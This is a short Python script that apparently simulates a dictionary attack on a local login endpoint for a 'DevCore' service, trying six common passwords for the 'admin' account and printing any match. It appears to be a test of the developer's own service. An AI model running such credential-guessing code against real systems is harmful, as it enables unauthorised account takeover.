import requests
import time

url = "http://localhost:5000/api/auth/login"
username = "admin"
# A tiny dictionary of passwords to simulate a dictionary attack
dictionary = ["123456", "password", "root", "qwerty", "admin", "superadmin"]

print("Starting HTTP Brute Force Attack against DevCore Auth Endpoint...")
start = time.time()

for pwd in dictionary:
    print(f"Trying password: {pwd}")
    try:
        response = requests.post(url, json={"username": username, "password": pwd})
        if response.status_code == 200:
            print(f"PASSWORD FOUND!!!!: pw == {pwd}")
            break
    except Exception as e:
        print(f"Request failed: {e}")

elapsed = time.time() - start
print(f"Time taken: {elapsed:.4f} seconds")
